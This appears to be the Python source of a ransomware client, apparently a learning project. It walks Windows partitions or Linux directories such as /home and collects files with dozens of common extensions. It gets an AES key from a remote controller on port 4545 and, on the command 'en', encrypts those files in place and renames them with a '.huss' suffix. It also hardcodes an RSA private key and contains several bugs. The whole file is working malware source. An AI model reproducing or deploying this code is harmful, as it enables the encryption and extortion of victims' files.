import os
import os.path
import socket
import threading
import time
from sys import platform
from tkinter import Y
from Crypto import Random
from Crypto.Util import Counter
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


def encryption_Files(key,nfile):
    counter = Counter.new(128)
    en=AES.new(key,AES.MODE_CTR,counter = counter)
    if os.path.exists(nfile):
        with open(nfile,"r+b")as f:
            block_size=16
            plaintext=f.read(block_size)
            while plaintext:
                f.seek(-len(plaintext),1)
                f.write(en.encrypt(plaintext))
                plaintext=f.read(block_size)
        os.rename(nfile,nfile+".huss")
        return [key]


def decryption_files(key,file_name):
    counter = Counter.new(128)
    de=AES.new(key,AES.MODE_CTR,counter = counter)
    with open(file_name,"r+b")as f:
        block_size=16
        plaintext=f.read(block_size)
        while plaintext:
            f.seek(-len(plaintext),1)
            f.write(de.decrypt(plaintext))
            plaintext=f.read(block_size)
    os.rename(file_name,file_name.strip(".huss"))


# this Function For listening to the partitions in Win and listing them  
def winpar():
    Partitions_Letter=[]                                # our paths will be in a list
    for Letter in range(65,91):                         # for our char from (A:Z)
        Letter = chr(Letter)+"://"                      # inside  'Letter' our path partition like "C:\\","E:\\" 
        if os.path.exists(Letter):
            Partitions_Letter.append(Letter)            # append our paths in our Partitions_Letter
    return Partitions_Letter


# this Function For listening to the partitions in Linux and listing them  
def linuxpar():
    Partitions=["/sbin","/home","/bin","/usr"]           # because we know our linux paths 
    return Partitions


# this Function listing all files in our partition based on Extentions
def directory(dir):
    files_Extensions = [
    'go', 'py', 'pyc', 'bf', 'coffee',
    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak' ,"gz","sln","pyproj","suo",
	'exe', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',
    'yml', 'yaml', 'json', 'xml', 'csv',
	'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx',
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
    'db', 'sql', 'dbf', 'mdb', 'iso',
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', 
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
    'java', 'class', 'jar', 
    'ps', 'bat', 'vb', 'bin',
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', 
	'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',
	'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', 
	'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', 
	]
    paths=[]                                   # inside it our files path with the extentions
    for d , sd , f in os.walk(dir):        
        for nfile in f:
            path=os.path.join(dir,nfile)
            fextenstion=path.split(".")[-1]
            if fextenstion in files_Extensions:
                paths.append(path)
    return paths

 
def client():
    pri_key = """-----BEGIN RSA PRIVATE KEY-----
    MIIEogIBAAKCAQEAxBPyXZFuJHcncVKMh58n1caF5LO1/BOCwYRCo4f4cxR7u17J
    ErHa8Rx8ydtAdmBg6TIuhlN7USrhPyv0hppYPoApAAgLYt7hu2Lm2qUtUlZkvA8G
    Ln81AhHi/RIejFPTb/IqW5a+dGtXtY/TTCpfEe4tqDFBOQdz85VcsAwKoliqr4mp
    b8Z/tJ6MH+/LZTUPqtJ5PTdm8RXLgmpjhh1IJ4sz7np7Su6FFqao6Sgwh3k+JIel
    g8/K7Txwd2Kv9AQBoamm2Q4ho+Sf1/d/7cjI2I8sazbyWTKyValU6q62ujUfX92f
    BOVxB0MdTYKkYPnXHSpBfWqKZXPrU/LeLwOhcwIDAQABAoIBADT8ZuxeFnOIN4Jq
    Gkuz+KHOSfRpk+4Qn68HvLJQVhVTHbSegpuosE+jsR0jQKI8nTOnOedWu+ZNPh1C
    FYwiPWJ2Y538jocjT8DBkzzWkg7EBejD7pm2Cm8Kwlo9AUBOjr6bpFKnw8PWFhec
    TC8y7An+YRwoY0Wz++OBI1D3kBAaiGHskxOBRW9VT1TeQZ7sFmi/EczwUQqDD25o
    3Zd+oe78hnoiP/eb5YgiVHjMxewsoY2dqH/Q5qgoVS7pUDK1ayksTp43JjTZTi06
    VNujMmHGCspEkgkxFFP1QrbZpYCHdEUtzelbB/dKx1JsT9MdsRJg1RqHGiy5kBU/
    7yIImSECgYEAz1xD5l/KCMzrcRH3Q+T5MoKZKaupeqT1zy83EDKk8ksgYN4XaIDx
    XSjTiH6ealRYtiK2Y+0nQvjFdBtY/4Xcvty6v68KBJED3bJe+ZDODRBWQPN7PD5d
    GepdnJUp9IrWIk2/eSkWMBam85S+HaSqnPYUJgUgR7SDN1ohFd/0RBkCgYEA8hIu
    iFg6UZom0tz5VOt+tsf9QaI74EmjH4uZnB3lbAMBe77g6wodHTtVw13i7ELCbrUD
    rIj2qyb8TOKqYpMilEmcItPHvjC/0JgheKkDNDVD+/iRAa34pDp47QkpVt4l/rWi
    BUKSYOjwI2bmNAC30lXHGmjR9HZuBGRwquDx42sCgYBdgmwUTYocYdyixslM0ssV
    3hMX2ZO5/P3kipQ4N75ujTZyuHSx6cPukOSjnwXtSVAgApNhiKa16t2QOGzv/fvI
    Dl4g5tyLpqGprjBqNsTU21MqQyKFzlHJyAii/hlHb/yUx57bEo4w7WYoXiFF2OYf
    llELvDAMZfjuUzSsWqwasQKBgCxgJOOduOMorSFOnO5yVUJQmx6jDPLqzNqFjt1N
    pbcNPgJfVYAA1KF9NRWham4BNv9wc4H3gbCSbwHxM2bqrhYdAGBqDl3RNfiZStmB
    sjKp6RKR2JNEPyZsCar6WPextalhxpfMQmU9jngO7vhtgUUvsFYpDQQRic2IVBcf
    MXiNAoGARstWsvqTHczlwhJ+bm1tBK5Ln1/8x/siOL0Tg38pHVwMJeNVNb9SZrTM
    6Wq2O0xkzEr6BHyVzboEB8KjiFvAGImxNLWT2UdkdSY23TuKIlYuwKcAzVMP5yVj
    xyj2m3TyPLwFEL302/O/5O3TvcTCM6R56X8PKnCU15LqJHC3WlM=
    -----END RSA PRIVATE KEY-----"""
    pri_key=pri_key.encode('ascii')
    private_key=RSA.importKey(pri_key)
    c = PKCS1_OAEP.new(private_key)
    port = 4545
    ip = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        key_data= s.recv(2048)
        decrypted_key = c.decrypt(key_data)
        key=decrypted_key.decode('ascii')
        padding = lambda data_key: data_key + (16 - len(data_key) % 16 )* "*"
        key=padding(key).encode('ascii')
        s.send(b'\nThe key is saved\n')
        while True:
            command = s.recv(2048)
            command = command.decode('ascii')
            if command == "en":
                if platform == "win32": 
                    er=directory(winpar()[1])
                    for f in er:
                        encryption_Files(key,f)
                if platform == "linux" or platform == "linux2": 
                    files=directory(linuxpar()[1])
                    for f in files:
                        encryption_Files(key,f)
                s.send(b'The Files are encrypted')
            if command == "de":
                if platform == "win32":
                    de=directory(winpar()[1])
                    for f in de:
                        decryption_files(key,f)
                if platform == "linux" or platform == "linux2": 
                    de=directory(linuxpar[1])
                    for f in de:
                        decryption_files(key,f)
                s.send(b'The decription is done')
            if command== "exit":
                s.close()
                break
    except socket.error as e:
        print("Trying again")
        time.sleep(4)
        s.close()
        client()
client()
